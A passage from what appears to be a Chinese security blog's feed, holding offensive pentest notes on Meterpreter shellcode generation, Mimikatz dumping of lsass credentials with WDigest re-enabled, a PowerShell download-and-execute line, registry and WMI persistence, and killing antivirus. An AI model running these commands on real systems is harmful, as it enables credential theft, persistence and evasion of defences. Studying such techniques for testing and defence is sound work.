href="https://github.com/brimstone/go-shellcode" target="_blank" rel="noopener">https://github.com/brimstone/go-shellcode</a></p><p>生成hex格式的shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444</span><br></pre></td></tr></table></figure><p>加载器进行加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\temp&gt;sc.exe shellcode</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;cc&quot;&gt;C/C++&lt;/span&gt;&lt;/h2&gt;&lt;h3&gt;&lt;span id=&quot;源码加载&quot;&gt;源码加载&lt;/span&gt;&lt;/h3&gt;&lt;h4&gt;&lt;span id=&quot;利用动态申请内存&quot;&gt;利用动态申请内存&lt;/span&gt;&lt;/h4&gt;&lt;figure class=&quot;highlight 
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Mimikatz明文密码抓取</title>
    <link href="https://uknowsec.cn/posts/notes/Mimikatz%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.html"/>
    <id>https://uknowsec.cn/posts/notes/Mimikatz明文密码抓取.html</id>
    <published>2019-07-20T14:17:17.000Z</published>
    <updated>2019-07-29T10:58:33.454Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="mimikatz">mimikatz</span></h2><h3><span id="procdumpmimikatz">procdump+mimikatz</span></h3><p><strong>KB2871997</strong></p><p>在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。</p><p>当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）</p><p>以下是支持的系统:</p><ul><li>Windows 7</li><li>Windows 8</li><li>Windows 8.1</li><li>Windows Server 2008</li><li>Windows Server 2012</li><li>Windows Server 2012R 2</li></ul><p>原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码</p><p>利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。</p><p>抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码</p><p>procdump64.exe导出lsass.dmp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>使用本地的mimikatz.exe读取lsass.dmp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_1.png" alt="mimi_1"></p><p>无法读取到密码。</p><p>在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。</p><p><strong>开启Wdigest Auth</strong></p><ul><li><p>cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure></li><li><p>meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure></li></ul><p><strong>关闭Wdigest Auth</strong></p><p>关闭命令如下：</p><ul><li><p>cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure></li><li><p>meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure></li></ul><p><strong>强制锁屏</strong></p><p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能抓明文密码。</p><p>强制锁屏，让管理员重新登录。</p><ul><li><p>cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Function Lock-WorkStation </span><br><span class="line">&#123;</span><br><span class="line">$signature = @&quot;</span><br><span class="line">[DllImport(&quot;user32.dll&quot;, SetLastError = true)]</span><br><span class="line">public static extern bool LockWorkStation();</span><br><span class="line">&quot;@</span><br><span class="line">$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru</span><br><span class="line">$LockWorkStation::LockWorkStation() | Out-Null</span><br><span class="line">&#125;</span><br><span class="line">Lock-WorkStation</span><br></pre></td></tr></table></figure></li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://x.x.x.x/Lock-WorkStation.ps1&apos;);&quot;</span><br></pre></td></tr></table></figure><p>重新读取，可读到明文密码。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_2.png" alt="mimi_2"></p><h3><span id="sqldumper-mimikatz">SqlDumper + mimikatz</span></h3><p>SqlDumper.exe是从SQL Server安装目录下提取出来的，<strong>功能和Procdump相似，</strong>并且也是微软出品的，体积远小于Procdump，也具备一定的免杀功能。SqlDumper.exe默认存放在C:\Program Files\Microsoft SQL Server\number\Shared，number代表SQL Server的版本，<strong>参考如下：</strong></p><p>140 for SQL Server 2017</p><p>130 for SQL Server 2016</p><p>120 for SQL Server 2014</p><p>110 for SQL Server 2012</p><p>100 for SQL Server 2008</p><p>90 for SQL Server 2005</p><p>如果目标机器没有安装SQL Server，可以自己上传一个SqlDumper.exe。</p><p><strong>用法：</strong></p><p><strong>1.查看lsass.exe 的ProcessID</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc |findstr lsass.exe</span><br></pre></td></tr></table></figure><p><strong>2.导出dump文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqldumper.exe ProcessID 0 0x01100</span><br></pre></td></tr></table></figure><p><strong>3.mimikatz加载dump文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h3><span id="sharpdump-mimikatz">SharpDump+ mimikatz</span></h3><p>项目地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/GhostPack/SharpDump</span><br></pre></td></tr></table></figure><p>编译生成的exe文件只有10KB左右，而且可过360。</p><p><strong>用法：</strong></p><p><strong>1.在管理员权限下运行生成debug480.bin</strong></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_5.png" alt="mimi_5"></p><p>修改debug480.bin为zip文件解压得到导出文件。</p><p><strong>mimikatz加载dump文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump debug480&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_6.png" alt="mimi_6"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;mimikatz&quot;&gt;mimikatz&lt;/span&gt;&lt;/h2&gt;&lt;h3&gt;&lt;span id=&quot;procdumpmimikatz&quot;&gt;procdump+mimikatz&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;KB2871997&lt;/strong&gt;&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>权限维持-注册表</title>
    <link href="https://uknowsec.cn/posts/uncategorized/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E6%B3%A8%E5%86%8C%E8%A1%A8.html"/>
    <id>https://uknowsec.cn/posts/uncategorized/权限维持-注册表.html</id>
    <published>2019-04-02T14:17:08.000Z</published>
    <updated>2019-04-02T14:17:54.551Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="runrunonce-keys">Run/RunOnce Keys</span></h3><p>用户级</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure><p>管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure><ul><li><p><code>HKEY_CURRENT_USER</code> 代表当前用户，当前用户登录后才执行的操作。</p></li><li><p><code>HKEY_LOCAL_MACHINE</code>代表当前机器，所有操作在用户登录后就执行了。</p></li><li><p><code>Run</code> 键值代表着开机启动项，也就是说在这个项下的键值会随着开机启动（这里的开机是指用户登录，也就是说只要有登录操作就会执行，注销然后登录，也会执行这个键值）。</p></li><li><p><code>RunOnce</code> 键值类似于 Run 键值，唯一的区别在于，<code>RunOnce</code> 键值只执行一次，操作执行后会被自动删除。</p></li></ul><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_1.png" alt="reg_1"></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_2.png" alt="reg_2"></p><h3><span id="bootexecute-key">BootExecute Key</span></h3><p>smss.exe进程是微软®公司为其发布的基于Windows NT系统（200/XP/Vista以及Win7等）定义的一个重要系统核心程序，官方描述为：Windows会话管理器。</p><p>smss.exe这是一个Windows后台进程，会随着系统一起启动。</p><p>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\hivelist</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_3.png" alt="reg_3"></p><ul><li><code>autocheck autochk *</code>。如果电脑出现蓝屏，将会在电脑重启后自动运行自检程序，试图对系统中存在的错误进行修复。</li><li>Autochk.exe 是<a href="https://baike.baidu.com/item/Windows%20NT" target="_blank" rel="noopener">Windows NT</a>架构的系统中的一个文件，用于确定卷检测（或磁盘检查）任务是手动安排的，还是由于文件系统发现卷处于“dirty”状态而自动安排的，然后判断是否在计算机启动时自动执行<a href="https://baike.baidu.com/item/chkdsk/1115947" target="_blank" rel="noopener">chkdsk</a>命令强制检测卷（磁盘），并将相应的消息写入应用程序事件日志中。</li></ul><h3><span id="userinit-key">Userinit Key</span></h3><p>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit这个注册表键的作用是在用户进行登陆时，winlogon运行指定的程序。根据<a href="https://technet.microsoft.com/en-us/library/cc939862.aspx" target="_blank" rel="noopener">官方文档</a>,可以更改它的值来添加与删除程序。</p><p>WinLogon进程加载的login scripts,具体键值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_4.png" alt="reg_4"></p><h3><span id="startup-keys">Startup Keys</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure><p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1554090222814.png" alt="1554090222814"></p><ul><li><code>Common Administrative Tools</code>自定义管理工具目录</li><li><code>Common AppData</code>自定义系统文件目录</li><li><code>Common Desktop</code>自定义桌面目录</li><li><code>Common Documents</code>自定义文档目录</li><li><code>Common Programs</code>自定义程序目录</li><li><code>Common Start Menu</code>自定义开始菜单目录</li><li><code>Common Startup</code>自定义开机启动项目录</li></ul><h3><span id="browser-helper-objects">Browser Helper Objects</span></h3><p>本质上是Internet Explorer启动时加载的DLL模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</span><br></pre></td></tr></table></figure><p>这个注册表项的每个子项都保存了一个浏览器助手的信息，所有浏览器助手在用户登录后以dll的方式加载，没有独立的进程，因此很难发现。并且必须在安全模式下才能删除。</p><h4><span id="生成dll">生成DLL</span></h4><p><a href="https://blog.csdn.net/feier7501/article/details/11266345" target="_blank" rel="noopener">C++开发BHO之HelloWorld</a></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_5.png" alt="reg_5"></p><p>设置项目<code>MFC的使用</code>和<code>ATL的使用</code>。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_8.png" alt="reg_5"></p><h4><span id="注册dll">注册DLL</span></h4><p>需要管理员权限，命令如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 helloworld.dll /s</span><br></pre></td></tr></table></figure><p><code>/s</code>参数用来去掉注册成功的提示框</p><p>卸载dll：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsve32 helloworld.dll /s /u</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_7.png" alt="reg_7"></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_6.png" alt="reg_6"></p><h4><span id="在ie页面注入js">在IE页面注入js</span></h4><p>可参考以下开源工程做进一步修改：</p><p><a href="https://github.com/xiyiaoo/BHO" target="_blank" rel="noopener">https://github.com/xiyiaoo/BHO</a></p><h3><span id="appinit_dlls">AppInit_DLLs</span></h3><p>加载User32.dll会加载的DLL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure><p>-　　<code>AppInit_DLLs</code>键的值可以是一个dll的文件名或一组dll的文件名(通过逗号或空格来分隔)，由于空格是用来分隔文件名的，因此dll文件名不能含有空格。第一个dll的文件名可以包含路径，但其他的dll包含的路径将被忽略。<br>-　　<code>LoadAppInit_DLLs</code>键的值表示<code>AppInit_DLLs</code>键是否有效，为了让<code>AppInit_DLLs</code>键的值有效，需要将<code>LoadAppInit_DLLs</code>的值设置为1。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_9.png" alt="reg_9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;runrunonce-keys&quot;&gt;Run/RunOnce Keys&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;用户级&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;sp
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>权限维持-WMI</title>
    <link href="https://uknowsec.cn/posts/notes/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-WMI.html"/>
    <id>https://uknowsec.cn/posts/notes/权限维持-WMI.html</id>
    <published>2019-04-01T14:17:17.000Z</published>
    <updated>2019-04-02T14:18:17.738Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="wmi">WMI</span></h3><p>WMI可以描述为一组管理Windows系统的方法和功能。我们可以把它当作API来与Windows系统进行相互交流。WMI在渗透测试中的价值在于它不需要下载和安装， 因为WMI是Windows系统自带功能。而且整个运行过程都在计算机内存中发生，不会留下任何痕迹。</p><h4><span id="检索系统信息">检索系统信息</span></h4><h5><span id="检索系统已安装的软件">检索系统已安装的软件</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product list brief |more</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_1.png" alt="wmic_1"></p><h5><span id="搜索系统运行服务">搜索系统运行服务</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief |more</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_2.png" alt="wmic_1"></p><h5><span id="搜索运行中的程序">搜索运行中的程序</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief |more</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_3.png" alt="wmic_3"></p><h5><span id="搜索启动程序">搜索启动程序</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup list brief |more</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_4.png" alt="wmic_4"></p><h5><span id="搜索共享驱动盘">搜索共享驱动盘</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic netuser list brief |more</span><br></pre></td></tr></table></figure><h5><span id="搜索用户名">搜索用户名</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount list brief |more</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_5.png" alt="wmic_5"></p><h5><span id="搜索计算机域控制器">搜索计算机域控制器</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic ntdomain list brief</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_6.png" alt="wmic_6"></p><h5><span id="搜索登录用户">搜索登录用户</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic logon list brief |more</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_7.png" alt="wmic_7"></p><h5><span id="搜索已安装的安全更新">搜索已安装的安全更新</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list brief |more</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_8.png" alt="wmic_8"></p><h4><span id="执行任务">执行任务</span></h4><p>WMIC不仅仅只是用于检索系统信息。在渗透测试中， 使用适当的命令，它也可以执行各种有用的任务。</p><h5><span id="卸载和重新安装程序">卸载和重新安装程序</span></h5><p>在渗透测试中， 我们经常遇到反病毒程序阻止payload运行。 这时候我们可以通过WMIC命令来卸载反病毒程序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product where &quot;name like &apos;%Office%&apos;&quot; get name</span><br><span class="line">wmic product where name=&quot;Office&quot; call uninstall</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_9.png" alt="wmic_9"></p><h4><span id="运行程序管理">运行程序管理</span></h4><p>上面我们提到卸载反病毒程序来运行payload。 但是有时候我们没有足够的权限去卸载程序。 这时我们可以通过WMIC命令来停止运行反病毒服务。</p><ol><li><p>第一步， 找到反病毒程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where &quot;name like &apos;%forti%&apos;&quot; get name</span><br></pre></td></tr></table></figure></li></ol><ol><li>第二步， 通过WMIC命令来停止运行反病毒服务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;FortiTray.exe&quot; call terminate</span><br></pre></td></tr></table></figure><h3><span id="powershell">Powershell</span></h3><p>自从PowerShell的出现，WMI功能已经被完全整合到了PowerShell里面。在PowerShell中， WMI拥有多个类型的种类，每个种类都代表一个内部组件：Win32_proces代表当前系统所运行程序。 Win32_Service代表当前系统所运行服务等等。</p><h4><span id="侦查">侦查</span></h4><h5><span id="操作系统相关信息">操作系统相关信息</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_BIOS</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_10.png" alt="wmic_10"></p><h5><span id="文件目录列表">文件/目录列表</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class CIM_DataFile</span><br></pre></td></tr></table></figure><h5><span id="磁盘卷列表">磁盘卷列表</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Volume</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_12.png" alt="wmic_12"></p><h5><span id="注册表操作">注册表操作</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\DEFAULT -Class StdRegProv</span><br><span class="line">Push-Location HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">Get-ItemProperty OptionalComponents</span><br></pre></td></tr></table></figure><h5><span id="当前进程">当前进程</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_14.png" alt="wmic_14"></p><h5><span id="列举服务">列举服务</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_15.png" alt="wmic_15"></p><h5><span id="日志">日志</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_NtLogEvent</span><br></pre></td></tr></table></figure><h5><span id="登陆账户">登陆账户</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_LoggedOnUser</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_15.png" alt="wmic_15"></p><h5><span id="共享">共享</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Share</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_17.png" alt="wmic_17"></p><h5><span id="补丁">补丁</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_QuickFixEngineering</span><br></pre></td></tr></table></figure><h5><span id="杀毒软件">杀毒软件</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct</span><br></pre></td></tr></table></figure><h4><span id="虚拟机检测">虚拟机检测</span></h4><p>（1）判断TotalPhysicalMemory和NumberOfLogicalProcessors</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$VMDetected = $False</span><br><span class="line">$Arguments = @&#123;</span><br><span class="line"> Class = &apos;Win32_ComputerSystem&apos;</span><br><span class="line"> Filter = &apos;NumberOfLogicalProcessors &lt; 2 AND TotalPhysicalMemory &lt; 2147483648&apos;</span><br><span class="line">&#125;</span><br><span class="line">if (Get-WmiObject @Arguments) &#123; </span><br><span class="line">$VMDetected = $True</span><br><span class="line">&quot;In vm&quot;</span><br><span class="line"> &#125; </span><br><span class="line"> else&#123;</span><br><span class="line"> &quot;Not in vm&quot;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>（2）判断虚拟机进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 